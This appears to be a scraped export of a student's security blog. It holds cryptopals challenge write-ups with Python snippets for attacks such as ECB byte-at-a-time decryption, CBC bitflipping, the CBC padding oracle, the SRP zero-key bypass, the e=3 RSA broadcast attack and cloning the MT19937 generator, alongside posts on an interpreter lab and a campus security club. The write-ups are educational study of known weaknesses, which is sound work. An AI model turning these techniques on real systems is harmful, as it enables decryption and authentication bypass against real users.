H(salt|password)x=H(salt‚à£password). A salt is a random value used to safeguard the password hash from being easily identifiable in a hash lookup rainbow table. After exchanging some parameters, both client and server produce a session key KKK. The server needs the verifier to get KKK, while the client needs the password. The server checks that the client‚Äôs KKK is equal to the server‚Äôs computed KKK, and if so, successfully authenticates the client. The full protocol can be seen on Wikipedia. Challenge 37 Break SRP with a zero key Some buggy implementations of SRP allow authentication without knowing the password, as this challenge illustrates. The server produces the session key KKK by S\\_{server} = (A\\cdot v^u)^b \\bmod N \\\\\\\\ K\\_{server} = H(S) where AAA and BBB (aaa and bbb) are random one time ephemeral keys of the user and server, vvv is the verifier, uuu is a ‚Äúscrambling parameter‚Äù. If AAA is 000 or a multiple of NNN, then S_server=0S\\_{server} = 0S_server=0, and we can authenticate simply by sending K_client=H(0)K\\_{client} = H(0)K_client=H(0) without knowing the password! Challenge 38 Offline dictionary attack on simplified SRP This problem isn‚Äôt really that interesting, so I skipped it. But here‚Äôs the lowdown: if you get MITM on SRP and thus can control the values for some parameters, b,B,ub, B, ub,B,u, and saltsaltsalt, then you can precompute the session keys KKK for common dictionary words. Doing the bruteforce cracking is not really that interesting, though. Challenge 39 Implement RSA The security of RSA is not based on the discrete log problem, but rather on the difficulty of factoring large numbers. We choose two large primes ppp and qqq, and compute n=pqn = pqn=pq. Then, we compute the totient, or Euler‚Äôs phi function, œï(n)=(p‚àí1)(q‚àí1)\\phi(n) = (p-1)(q-1)œï(n)=(p‚àí1)(q‚àí1). The public key eee is usually a small number like 3 or 65537 that is coprime to nnn, and we derive the private key ddd such that d‚àóe=1modœï(n)d*e = 1 \\bmod \\phi(n)d‚àóe=1modœï(n). This is exactly the definition of a modular inverse, so ddd is the modular inverse of eee. I implement the Extended Euclidean Algorithm to find the modular inverse of a number, using the algorithm in Pelzl. The EEA will compute the coefficients of the equation gcd(n,e)=s‚ãÖn+t‚ãÖe=1modngcd(n, e) = s\\cdot n + t\\cdot e = 1 \\bmod n gcd(n,e)=s‚ãÖn+t‚ãÖe=1modn The gcd is 1 because nnn and eee are coprime. s‚ãÖn=0modns\\cdot n = 0 \\bmod ns‚ãÖn=0modn, so we are left with t‚ãÖe=1modnt\\cdot e = 1 \\bmod nt‚ãÖe=1modn, directly giving us t=dt = dt=d. Here‚Äôs my EEA: 123456789101112131415161718192021222324252627def egcd(r0, r1): ''' takes the modulus in r0, and the element in r1 returns tuple of (gcd, coefficient 1, coefficient 2) s.t. s0*r0 + t0*r1 = gcd if first value is a modulus, gcd = 1 and t0 is modinv of r1 ''' old_r0, old_r1 = r0, r1 s0, s1 = 1, 0 t0, t1 = 0, 1 while r1 != 0: remainder = r0%r1 q = (r0-remainder)/r1 assert q*r1 + remainder == r0 r0, r1 = r1, remainder new_s = s0 - q*s1 new_t = t0 - q*t1 assert new_s*old_r0 + new_t*old_r1 == remainder s0, s1 = s1, new_s t0, t1 = t1, new_t return (r0, s0, t0) and the driver function that returns the modular inverse: 123456def modinv(mod, a): (gcd, a, b) = egcd(mod, a) if gcd != 1: return None return b % mod With the modinv function, the rest of RSA is straightforward. Challenge 40 E=3 RSA Broadcast Attack 20 Years of Attacks on RSA describes some great attacks on RSA that come in CTFs as well as Matasano challenges. One of the simplest is Hastad‚Äôs broadcast attack, which allows us to recover a message that has been encrypted with RSA pubkeys that are very small, such as e=3e = 3e=3. The Chinese Remainder Theorem is the key to this problem. As the paper describes, we only need the same message encrypted with three different public keys to recover the plaintext. C_1 = M^3 \\bmod N_1 \\\\\\\\ C_1 = M^3 \\bmod N_2 \\\\\\\\ C_1 = M^3 \\bmod N_3 \\\\\\\\ The CRT tells us that there exists some value C‚Ä≤C&#x27;C‚Ä≤ that satisfies C‚Ä≤=M3modN1N2N3C&#x27; = M^3 \\bmod N_1N_2N_3C‚Ä≤=M3modN1‚ÄãN2‚ÄãN3‚Äã, a solution to all the equations. We just need to calculate the C‚Ä≤C&#x27;C‚Ä≤ and take its cube root, recovering MMM. The challenge just gives you the CRT equation to solve for C‚Ä≤C&#x27;C‚Ä≤. 123456789101112m_s_1 = N2*N3y1 = ctext1 * m_s_1 * modinv(N1, m_s_1)m_s_2 = N1*N3y2 = ctext2 * m_s_2 * modinv(N2, m_s_2)m_s_3 = N2*N1y3 = ctext3 * m_s_3 * modinv(N3, m_s_3)mod_prod = N1*N2*N3result = (y1 + y2 + y3) % mod_prod Python‚Äôs cube root (**(1/3.)) is not entirely precise, so I use the gmpy multiple-precision library. 1234cube_root = gmpy.mpz(result).root(3)[0].digits()decrypted_text = binascii.unhexlify(str(hex(int(cube_root))[2:]))assert decrypted_text == \"can't touch this\"","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Writing a C++ Interpreter for MITScript","slug":"Writing-a-C-interpreter-for-MITScript","date":"2017-04-15T21:38:37.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/04/15/Writing-a-C-interpreter-for-MITScript/","link":"","permalink":"http://raywang.tech/2017/04/15/Writing-a-C-interpreter-for-MITScript/","excerpt":"Lab 2 in 6.035 was very satisfying and very fun. After creating the parser/lexer in Lab 1, we got to put our Abstract Syntax Tree to work ‚Äî we created an interpreter to actually execute valid MITScript! By the end of this lab, we will be able to write arbitrarily complex programs and have them parsed and run.","text":"Lab 2 in 6.035 was very satisfying and very fun. After creating the parser/lexer in Lab 1, we got to put our Abstract Syntax Tree to work ‚Äî we created an interpreter to actually execute valid MITScript! By the end of this lab, we will be able to write arbitrarily complex programs and have them parsed and run. We have a list of semantic rules that are generally pretty straightforward, but let me point out some interesting aspects. Note that in the stack we map identifiers(variable, function names, etc.) to addresses, and the heap maps addresses to the actual Values. One cool thing is that we don‚Äôt need to implement the heap ourselves ‚Äî we can just use the memory allocation built into our language! Anyone familiar with C++ will know of new, which actually allocates space in the heap for an object, and returns a pointer (address) to that space. It seems like a daunting task, but you just have to break it up into small chunks. The professor, Armando, gave us some direction on Piazza for how to get started. Start by defining your Value types. Define a Value class and define sub-classes corresponding to each of the different value types. Define a StackFrame class to represent your stack frames. You can implement the update and read functions as methods in the stack frame. Implement a Visitor that corresponds to your interpreter. By tomorrow, you should also be able to start implementing the behavior for all your operators. The ‚ÄònewStackFrame‚Äô function and the complete logic for updating and reading variables when you have multiple scopes will become clear after we do the lecture on closures. Finally, you will want to implement support for returns that are not at the end of the function and for native functions. Jason Priest, Meghana, and I got together to work on it. The key thing to note when implementing the interpreter is that everything is specified in the semantics ‚Äî you need to follow it exactly when translating into code, and you can find the answer to all your questions by close examination. Not exactly following the order that Armando suggested, the first thing I tried to do was to get assignments and operators working, so I could do something as simple as x = 5; y = 5; z = x + y;. This would have given me a huge confidence boost, since I felt pretty intimidated by the scope of the lab. Roughly, I tackled this piece-by-piece in the following order: binary ops, assignments, record creation/assignments, function creation/calling, native functions, early returns. Of course, the ninety-ninety aphorism of software engineering holds: The first 90 percent of the code accounts for the first 90 percent of the development time. The remaining 10 percent of the code accounts for the other 90 percent of the development time. The remaining 10% of code on this lab was debugging the ten class-provided tests. Data Structures I first set up the Visitor interface for the interpreter. For more information on how the Visitor interface works, see my previous post. Then for each of the Value types 123456BooleanIntegerStringFunction ::= (frame, code)Record ::= Map[String, Value]*None , I defined toString() functions and a type field (so the overloaded boolean operators like + know what values they‚Äôre operating on). I also added methods like asFunction() and asRecord() that will throw an IllegalCastException if they‚Äôre called in the wrong context, or otherwise return this. I still wasn‚Äôt sure how to deal with Stack Frames. The way that stack frames work is that there is a global stack of these StackFrames, and each StackFrame should contain the ‚Äúcontext‚Äù of the currently-executing function. When a function is called, a new StackFrame is created, containing its set of local variables and a pointer to its parent frame (the frame where the function was called.) I discovered during debugging that, when an MITScript program starts executing, it should be inside the global StackFrame ‚Äî all assignments that it makes are available globally. When we need to access a variable, we must check for its existence in the globals, the local frame, and then search recursively in parent stack frames. Function calls The function call is the most complex construct in our language. Most importantly, when we make a call, we need to traverse the body of the function, looking for globals and assignments, and add them to our new StackFrame. This is another case where I needed to know the type of objects ‚Äî but here, I need to know the type of an AST object. I use dynamic_cast. 12345if (Global* globCast = dynamic_cast&lt;Global*&gt;(stmt))&#123;...&#125; else if (IfStatement* ifCast = dynamic_cast&lt;IfStatement*&gt;(stmt))&#123;...&#125; Note that we need to recursively search inside if statements and while loops during the scan, as well. Native Functions But how to do the native functions? Jason gave me a hint here ‚Äî create a subclass of Function, which I call NativeFunction. We need to support the following: print(s) Uses the default casting of s to a string and prints it to the console followed by a newline. input() Reads a line of input from the console and returns it as a string value. intcast(s) Expects a string and internally uses the c++ function atoi to parse the string and return an integer value. If the string does not represent an integer (e.g., the string ‚Äúhello‚Äù), the function should raise an IllegalCastException NativeFunction has an evaluateNativeFunction() method that will do the right thing. After adding the ability to return early from functions, I have a really hacky interpreter! Debugging tests Some of these test cases reveal interesting effects of our semantics. For example, test7.mit has a global declaration inside an if statement that‚Äôs never run ‚Äî equivalent to 123if (false)&#123; global x; &#125; In this case, we actually need to find this global and make x global in the scope. This is called variable hoisting. Note that there are a lot of crappy things about this interpreter ‚Äî there is no garbage collection of unused objects, so memory usage might blow up, and it is costly to search recursively for a variable in parent stack frames. The next lab translates our MITScript into bytecode that can optimize away these costs.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Upcoming Blog Posts ‚Äî Stay Tuned!","slug":"Upcoming-blog-posts-‚Äî-when-I-get-to-them","date":"2017-04-04T18:57:58.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/04/04/Upcoming-blog-posts-‚Äî-when-I-get-to-them/","link":"","permalink":"http://raywang.tech/2017/04/04/Upcoming-blog-posts-‚Äî-when-I-get-to-them/","excerpt":"I‚Äôve been insanely busy with a bunch of cool things, which means both more blog content, but also quite a large latency before I get around to writing them. Here‚Äôs what I‚Äôve been up to, and what awesome posts/series you can expect in the coming weeks: 6.115 Labs and Final project ‚Äî Masterlock combo breaker? 6.857 Final project ‚Äî Boston Symphony Orchestra iPad app pentest CTFs ‚Äî MITCTF, Cambridge2Cambridge 6.035 MITScript interpreter in Rust","text":"I‚Äôve been insanely busy with a bunch of cool things, which means both more blog content, but also quite a large latency before I get around to writing them. Here‚Äôs what I‚Äôve been up to, and what awesome posts/series you can expect in the coming weeks: 6.115 Labs and Final project ‚Äî Masterlock combo breaker? 6.857 Final project ‚Äî Boston Symphony Orchestra iPad app pentest CTFs ‚Äî MITCTF, Cambridge2Cambridge 6.035 MITScript interpreter in Rust ## 6.115 Final project ‚Äî Masterlock combo breaker? Over spring break last week, I spent almost every day in lab for 6.115, working on the infamous Lab 4. The lab is centered around motors. We code assembly for controlling a robot arm with five DC motors providing five degrees of freedom. We also control a unipolar stepper motor for a toy version of optical tomography ‚Äî getting a cross-section of a dowel on a spinning disk. Practical Electronics for Inventors by Paul Scherz is an awesome book. It‚Äôs very readable, and without the chapter on DC/stepper motors, this lab would not have been possible. Final Project I have a cool idea for my 6.115 final project. The amazing hacker Samy Kamkar built a Masterlock combo breaker, and I really want to make one of these for my final project. Since I need to use both the 8051 microcontroller and the Cypress PSOC, I could have the 8051+LED interface for selecting combinations, and have the cracking algorithm coded in C for the PSOC. That still may not be enough code‚Ä¶ maybe I could also have some computer vision such that I can observe someone turning the lock, and then record/replay the combo? Anyways, will definitely be blogging about my progress on this. ## 6.857 Final project ‚Äî Boston Symphony Orchestra iPad app pentest I also need to get started on my 6.857 project, which is penetration testing an iPad application for the Boston Symphony Orchestra. We have an iPad, so I just need to setup a pentesting environment on it and start playing with it! ## CTFs! I've done a few MIT-based CTFs in the past few weeks ‚Äî MITCTF, organized by Steven Valdez and my fellow TechSec lead Max Justicz, and the [Cambridge2Cambridge CTF Qualifier](https://cambridge2cambridge.csail.mit.edu/) which I think is one of the most exciting initiatives to come out of MIT. In the inaugural event last year, Cambridge University students came to MIT for an attack-defense CTF and other fun physical challenges like lockpicking. This year's final will be held at Cambridge University in July, so I hope I qualified! I've definitely seen a lot of improvement in my skills since last year ‚Äî I'm a lot more comfortable with crypto, and have come a long way in pwn and reversing. ## 6.035 ‚Äî MITScript and Rust Also, I really need to get cracking on Rust and our 035 bytecode interpreter for Lab 3! Once I‚Äôve finished Lab 3, I‚Äôll publish my blog posts for Lab 2 and Lab 3. Maybe I‚Äôll write something about learning Rust, as well üòâ.","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[]},{"title":"Starting a New Security Club at MIT","slug":"Starting-a-new-security-club-at-MIT","date":"2017-03-14T15:38:51.000Z","updated":"2017-12-27T20:42:13.000Z","comments":true,"path":"2017/03/14/Starting-a-new-security-club-at-MIT/","link":"","permalink":"http://raywang.tech/2017/03/14/Starting-a-new-security-club-at-MIT/","excerpt":"","text":"fortenforge, Devin Neal, and I decided that MIT needed more of a student security community on campus. So, we started TechSec in February 2017! We host weekly meetings on Monday nights and try to get students to compete with us in CTFs on weekends. You can find our meeting/workshop notes, which we laboriously compile for the benefit of our club members, here. So far, we‚Äôve been holding introduction to reverse engineering and binary workshops. We have a lot more planned, including interesting guest speakers.","categories":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/categories/TechSec/"}],"tags":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/tags/TechSec/"}]},{"title":"Matasano Crypto Challenges, Set 2","slug":"set2_writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/03/07/set2_writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set2_writeup/","excerpt":"Challenge 9 Implement PKCS#7 padding As the challenge states, ‚ÄúA block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.‚Äù The PKCS#7 padding scheme will append the number of bytes of padding to the end of the block. I use the pwntools pack() function to pack the number of padding bytes.","text":"Challenge 9 Implement PKCS#7 padding As the challenge states, ‚ÄúA block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.‚Äù The PKCS#7 padding scheme will append the number of bytes of padding to the end of the block. I use the pwntools pack() function to pack the number of padding bytes. Challenge 10 Implement CBC mode This challenge has us implement CBC mode of block encryption. In CBC mode, each block of plaintext is XORed with the previous ciphertext block before being encrypted. We need an IV for the first block of plaintext. In set2_utils, I create a CBC Cipher class that takes in a cipher and an IV. The encrypt() function will split the plaintext into blocks (usually size 16), and then do the encryption: 1234567# Xor with previous block. First prev_xor_block is the IV.pre_aes_block = xor(blocks[i], prev_xor_block)# Encrypt with cipher algorithmcurrent_cipher_block = e.update(pre_aes_block)prev_xor_block = current_cipher_blockciphertext += current_cipher_block The decryption takes each block of ciphertext, decrypts it, and XORs with the previous block of ciphertext to recover the plaintext. 12345for i in xrange(1, len(blocks)): decrypted_block = d.update(blocks[i]) # print decrypted_block plaintext += xor(decrypted_block, blocks[i-1]) # where blocks[i-1] is the previous ciphertext block I can verify I‚Äôve done this correctly by decrypting 10.txt with a CBC Cipher with IV '\\x00'*16. Challenge 11 An ECB/CBC detection oracle This challenge asks us to detect whether we‚Äôve encrypted a text with ECB or CBC, chosen at random. Recall the properties of ECB vs CBC ‚Äî ECB will take two identical plaintext blocks and produce two identical ciphertext blocks. This is as simple as asking the oracle to encrypt a string that contains at least two consecutive blocks of identical characters. If the oracle chooses ECB, the ciphertext will have two adjacent identical blocks as well. To ensure that we have at least two consecutive blocks of identical characters, we need to input at least 43 bytes. Why? Because the oracle pads the plaintext with 5-10 bytes, so we need to give some offset to ensure our identical plaintext blocks are properly aligned. R = random_nfix 123|--------16-----||-5-| |---11----| |--------16----| |--------16----|RRRRR 00000000000 0000000000000000 0000000000000000 Challenge 12 Byte-at-a-time ECB decryption (Simple) I have an oracle that produces AES-128-ECB(your-string || unknown-string, random-key). I can find unknown-string with this oracle. The idea is that, First, I need to find the block size of the cipher. Then, assuming I know it‚Äôs using ECB, I can find the flag byte-by-byte. How? Since I control my-string, I can ensure each time that the oracle encrypts 15 bytes that I know + one unknown byte. I can then create a table of all possible ciphertexts of the 15 known bytes + 1 unknown byte, and compare the ciphertext the oracle returns to the ciphertexts in my table. To find the block size, I feed in incrementing offsets to the oracle, until the ciphertext length increases. The size of the increase will be block_size, because of the padding. Next, I need to get an offset of 15 known bytes to feed into the oracle. The first offset is just 15 filler variables, all A‚Äôs. 12345678U = unknown flag byteK = known flag byteInput to oracle, |-16-| bytes to be looked up in table: |----offset----| |--------16-----|plaintext: AAAAAAAAAAAAAAAU UUUU..... And I create a table of all possible ciphertexts of A‚Ä¶U. 1234for cand in candidates: # every candidate block of ciphertext is 16 bytes block_of_interest = oracle(offset+cand)[0:blocksize] cand_dict[block_of_interest] = cand I then feed the block with the unknown byte to the oracle, padding with the same filler variables as my offset. Perform the table lookup. 12345oracle_block = oracle('A'*offset_len)[block_of_interest : block_of_interest + blocksize]if oracle_block in cand_dict: next_byte = cand_dict[oracle_block] At the next iteration, I decrease the number of filler variables by 1, since I have a known byte and want the next byte. 123Input to oracle, |-16-| bytes to be looked up in table: |--------16-----|plaintext: AAAAAAAAAAAAAAKU UUUU..... When I have 16 known bytes in this manner, I no longer need filler variables in my offset; I can just use the previous 15 known bytes as my offset. Note that my lookup table can be populated with ciphertexts of 16 flag bytes. Since I have 16-byte ciphertexts in my lookup table, I need to first align, then get the index of, the 16-byte block-of-interest that I‚Äôll look up in my table. 123456Input to oracle, |-16-| bytes to be looked up in table:block_num: 0 1 block_of_interest alignment bytes |--------16-----|plaintext: AAAAAAAAAAAAAAAK KKKKKKKKKKKKKKKU UUUU..... Stopping after I run out of bytes, I find the answer is 1Rollin' in my 5.0\\nWith my rag-top down so my hair can blow\\nThe girlies on standby waving just to say hi\\nDid you stop? No, I just drove by\\n Challenge 13 ECB cut-and-paste Challenge 14 Byte-at-a-time ECB decryption with random prefix In this challenge, a random-length prefix is added to the attacker-controlled string, AES-128-ECB(random-prefix || attacker-controlled || target-bytes, random-key). Thus, I need to know the length of the prefix to be able to conduct the same attack as Challenge 12. Finding this length is not so hard. First, I can find the block index of the last byte of the prefix with just two calls to the oracle. Then, I find the offset of the last byte of the prefix within the last block. 12ciphertext1 = prefix_oracle('')ciphertext2 = prefix_oracle('A') Because this is ECB mode, the first different block between ciphertext1 and ciphertext2 will be the last block of the prefix. 12345678910U = unknown flag byteR = random prefix byteplaintext1:|--------16----||-enc to different value-|RRRRRRRRRRRRRRRRRRRRUUUUUU....plaintext2:|--------16----||-enc to different value-|RRRRRRRRRRRRRRRRRRRRAUUUUUU.... Now that I know what block the last byte of the prefix is in, find_prefix_block_modulo_offset finds the offset of the last byte of the prefix. I want to align two blocks of identical plaintext, to encrypt to two blocks of identical ciphertext. The amount of offset I use to align will tell me the offset of the prefix. 123for i in xrange(0, blocksize): offset = 'A'*i + '\\x00'*32 ciphertext = prefix_oracle(offset) 123456789 |--offset-|RRRRR00000000000 0000000000000000 0000000000000000 UUUUUU....```pythonIn the above example, the two 16-byte-aligned blocks of \\x00's will encrypt to adjacent identical ciphertext, which I can detect.Finally, `find_next_byte_with_prefix` will do the work. The offset is now```pythonoffset = 'A'*(extra_offset_for_prefix + offset_len) , with offset_len always being 15 known bytes, as in Challenge 12. The keys in my lookup table are no longer a fixed-length of blocksize ‚Äî they include all known bytes now. Here, the len(offset) is not always 15, as in Challenge 12. Also, the length of my lookup table keys is not always blocksize; rather, the length of my keys increases with the number of known bytes. I could have implemented this more similarly to Challenge 12, which would have been less computationally expensive. How do I produce ciphertext keys for my lookup table now? Here‚Äôs what I feed into the oracle: 12for cand in candidates: table_key = oracle(offset + knownbytes + cand)[prefix_location: prefix_location + len(offset) + len(knownbytes) + 1] 12 |--lookup table key---------|RRRRRAAAAAAAAAAA AAAAAAAAAAAAAAAU UUUU..... 123456 |-------------------lookup table key---------| |---offset-------|extra_offset_for_prefix | |RRRRRAAAAAAAAAAA AAAAAKKKKKKKKKKK KKKKKKKKKKKKKKKU UUUU..... Calling find_next_byte_with_prefix byte-by-byte, I find the same flag as before. 1Rollin' in my 5.0\\nWith my rag-top down so my hair can blow\\nThe girlies on standby waving just to say hi\\nDid you stop? No, I just drove by\\n Challenge 15 PKCS#7 padding validation Here‚Äôs an easy one. We need only validate that the PKCS7 padding is correct. 123byte = s[-1]pad_length = unpack(byte, 'all')if byte == 0 or s[-pad_length:] != byte * pad_length or byte == \"\": I check if the last pad_length bytes of s are equal to the string of byte repeated pad_length times, as it should be in a properly padded string. Challenge 16 CBC bitflipping attacks We have a function that takes user input and url-encodes special characters, and we want to exploit the properties of CBC to allow us to insert the string ‚Äú;admin=true;‚Äù without the ‚Äú;‚Äù and ‚Äú=‚Äù being validated out. Recall that CBC takes each block of ciphertext and XORs it with the next block of decrypted ciphertext to recover the plaintext. If I can modify at least two consecutive blocks of ciphertext, I can make the second block decrypt to whatever I want. I know that \\x00 ^ \\x59 = ; and \\x00 ^ \\x61 = '=' from ascii chart. 1234567891011user-controlled input: 0 1AAAAAAAAAAAAAAAA \\x00admin\\x00true\\x00ciphertext:XXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXmodified ciphertext:\\x59XXXXX\\x61XXXX\\x59XXXX XXXXXXXXXXXXXXXXIn XOR step of CBC decryption, the 2nd block would normally XOR to recover \\x00admin\\x00true\\x00, but now that I&apos;ve done an additional XOR on three bytes by modifying ciphertext, the 2nd block XORs to a plaintext of \\x59admin\\x61true\\x59. Done with set2!","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 3","slug":"set3-writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/03/07/set3-writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set3-writeup/","excerpt":"Challenge 17 The CBC padding oracle!!! The CBC padding oracle is a very famous attack. We have an oracle function that takes in a ciphertext and decrypts it, returning True if the plaintext is padded properly. The process behind the attack on each block is:","text":"Challenge 17 The CBC padding oracle!!! The CBC padding oracle is a very famous attack. We have an oracle function that takes in a ciphertext and decrypts it, returning True if the plaintext is padded properly. The process behind the attack on each block is: For each byte, starting at the last position, modify the ciphertext in the previous block, cycling through all 256 possibilities for the plaintext until I find the correct one. Here‚Äôs the explanation of how I make and check my guesses. For the currently examined block, remember that I can modify the previous block‚Äôs ciphertext, which will be XORed with this block‚Äôs intermediate state to get a modified plaintext. What is the goal for the modified plaintext? It‚Äôs to get the proper padding bytes at the end of it! So, to decrypt the last byte of the block, I first provide the correct offset 123new_ciphertext, C':block -2 -1AAAAAAAAAAAAAAAZ XXXXXXXXXXXXXXXU If I cleverly choose the value of Z, then the last byte of C‚Äô, U above, will XOR to the correct padding byte, \\x01. I XOR out the corresponding byte from the ciphertext, XOR out a guess for the flag byte character, and XOR in the desired padding byte (\\x01). 1pad_str = offset_pad + xor(prev_block[-desired_padding_byte], cand_ord, desired_padding_byte) I create the new_ciphertext C' by inserting my crafted block C[-2]' before the block I‚Äôm currently examining. 1new_ciphertext = ciphertext[:-32] + pad_str + ciphertext[-16:] If my guess is correct, then only \\x01 will be left, and padding_oracle(new_ciphertext) will return True. If I‚Äôm not examining the last character in the block, then the desired padding bytes will be something greater than \\x01. I modify the following ciphertext bytes I‚Äôve already solved to XOR out the ciphertext byte, XOR out the known flag bytes, and XOR in the desired padding byte (\\x02 - \\xF). 1pad_str = pad_str + xor(prev_block[-desired_padding_byte+1:], known_last_bytes, desired_padding_byte) if len(known_last_bytes) &gt; 0 else pad_str As before, the correct guess will cause the byte of interest to XOR to the proper padding byte, and padding_oracle(new_ciphertext) will return True. 123new_ciphertext, C':block -2 -1AAAAAAAAAAAAAAZK XXXXXXXXXXXXXXUK Above, I want the plaintext bytes at positions UK to decrypt to \\x02\\x02. Modifying K to decrypt to \\x02 is simple because I already know the byte and can fully control what to XOR in or out. Note: The ‚Äòprevious ciphertext‚Äô block for the first block is the IV, so we perform the XORs on it the same way we would modify any other block. The wrapper function, padding_oracle_attack(padding_oracle, ciphertext, blocksize), will loop through calls to decipher_block to find the last block, append the found bytes to the flag, and on the next iteration, slice out the blocks of ciphertext I‚Äôve already solved. Challenge 18 This challenge is to implement CTR (Counter) stream cipher mode. CTR mode does not encrypt the plaintext ‚Äî rather, it encrypts a running stream of counter bytes, which is then XORed with the plaintext. One benefit of CTR mode is that it does not require padding. I define a CTR() class in set3_utils. Decryption is identical to encryption. In encrypt, I generate the keystream, in 128 byte chunks, for all of my plaintext, which looks like 12keyblock = e.update(p64(self.nonce, 'little') + p64(self.counter, 'little'))keystream += keyblock These are pwntools packing functions, packing the counter in little-endian format. The nonce is a random, secret value that composes the first 64 bytes of every keystream block. After XORing my keystream with the plaintext, I save the unused keystream bytes in self.carry_over_bytes. The next time I run decrypt() or encrypt(), I set keystream = self.carry_over_bytes so I use all the bytes of previously-generated keystreams. Challenge 19 Break fixed-nonce CTR mode using substitutions Challenge 20 Break fixed-nonce CTR statistically In this challenge, using a fixed-nonce for CTR will essentially boil down to solving repeating-key XOR, where the repeating-key is the reused ciphertext of the CTR keystream. I know that each encrypted text has been XORed with the same keystream. I first pad each encrypted text with 0‚Äôs to the same length (anything longer than the longest line). 1padded_encrypted_texts = [text.ljust(max_length, '0') for text in encrypted_texts] Then, I can simply concatenate all the ciphertexts into one long string, as if a repeating-xor-key of length max_length had been applied. 1keystream = breakRepeatingXor(\"\".join(padded_encrypted_texts), max_length) The result will be a keystream that, when XORed with each encrypted text, should produce mostly readable text. The accuracy towards the end of the longer strings will degrade, because there is not enough information to determine the correct key ‚Äî there are simply not enough strings near the maximum length to determine the key based on letter frequency. Challenge 21 Implement the MT19937 Mersenne Twister RNG The Mersenne Twister is by far the most common PRNG (pseudo-random number generator). The most common version is based on the Mersenne prime 219937‚àí1, and has a known set of constants and magic values. There are three main components of MT19937, 32-bit values. Initialization of the first set of 624 values from a seed Outputting the next number from the RNG, after some tempering Generating a new set of 624 values (twisting) In step 1, we initialize the self.state array by setting the first value to be the seed, and then calculating the rest from the formula off Wikipedia, x[i] = f √ó (x[i-1] ‚äï (x[i-1] &gt;&gt; (w-2))) + i, where w is the word size, 32 bits. 12for i in xrange(1, 624): self.state[i] = self.int32(f * (self.state[i-1] ^ (self.state[i-1] &gt;&gt; 30)) + i) where f is a magic, 1812433253. In step 2, the RNG outputs a number by taking the next state value, indexed by self.index, and applying some temper transforms before returning it. Then, we increment self.index to use the next state value next time. When we have used up 624 values, we ‚Äútwist‚Äù to generate more. For each state value, the RNG concats the MSB of the current state value and the other 31 bits from the next state value. 1y = (self.state[i] &amp; 0x80000000) + (self.state[(i+1) % 624] &amp; 0x7fffffff) Then it does the A transform above: right-shifts by one, and XORing an additional magic if the current state value is odd. We also XOR with the 397th-next former state variable. 1self.state[i] = self.state[(i+397) % 624] ^ (y&gt;&gt;1) 123if y % 2 != 0: # if odd, xor with another magic number self.state[i] ^= 0x9908b0df Challenge 22 Crack an MT19937 seed Challenge 23 Clone an MT19937 RNG from its output TO clone an MT19937 RNG, we need to find its 624-value internal state. We need to get 624 RNG outputs, and untemper each one. The untempering is very tricky ‚Äî remember that we did this sequence of two right shifts and two left-shift ANDs: 1234temp ^= (temp &gt;&gt; 11)temp ^= (temp &lt;&lt; 7) &amp; 2636928640temp ^= (temp &lt;&lt; 15) &amp; 4022730752temp ^= (temp &gt;&gt; 18) Let‚Äôs see how to undo that right shift: 123410110111010111110001000011001110 ^00000000000000000010110111010111 (&gt;&gt;18)=10110111010111110011110100011001 We iterate through all the bits of the output, starting from the leftmost bit 123456for i in xrange(32): output_bit = getBit(binary_str, i) recovered_bit = output_bit ^ getBit(orig_bits, i - shift) # set the bit at index i in the orig_bits to be the recovered bit orig_bits = setBit(orig_bits, i, recovered_bit) While i &lt; shift, getBit() will return 0 as the XOR bit, and recovered_bit will just be the same as the output bit. When i = shift, orig_bits will contain the first shift original bits. getBit(orig_bits, i - shift) will emulate the right-shifted original value, grabbing original bit values, starting from the left of orig_bits. Thus, the XOR of the output_bit and the corresponding index of orig_bits will recover the next original bit. 1234567891011121314When i = 18output: 18___ |10110111010111110011110100011001orig_bits:101101110101111100recovered_bit:output[18] ^ orig_bits[0] 1 ^ 1 = 0 Note that, if shift &lt; 16, at some point each recovered original bit is used immediately in the next iteration of the for loop to recover the next bit. To untemper the left shift + and + xor, we reconstruct the original from the right side, not the left. 1234567891011 24--- | \\/ 1011011101011111000100001 1001110 ^ (&lt;--orig_bits)1010111110001000011001110 0000000 (&lt;&lt; 7) =__________________________________0001100011010111011101111 1001110 &amp;1001110100101100010101101 0000000 (&lt;--2636928640 magic) =__________________________________0001100000000100010101101 0000000 output_bits 123456for i in reversed(xrange(32)): output_bit = getBit(binary_str, i) undo_xor_bit = getBit(orig_bits, i + shift) &amp; getBit(and_val, i) recovered_bit = output_bit ^ undo_xor_bit orig_bits = setBit(orig_bits, i, recovered_bit) While i + shift &gt; 31, the undo_xor_bit is 0, so the last shift bits of orig_bits are identical to the last shift output_bits. Once i &lt;= 31-shift, we begin using values from the right side of orig_bits, emulating the left-shifted value. We then &amp; in the magic bit, and XOR with the output bit to recover the next original bit. 123456789When i = 24undo_xor_bit:orig_bits[31] &amp; and_value[24] 0 1 = 0recovered_bit:output[24] ^ undo_xor_bit = 1 ^ 0 = 1 Our final untemper function is just reversing the 4 tempers, 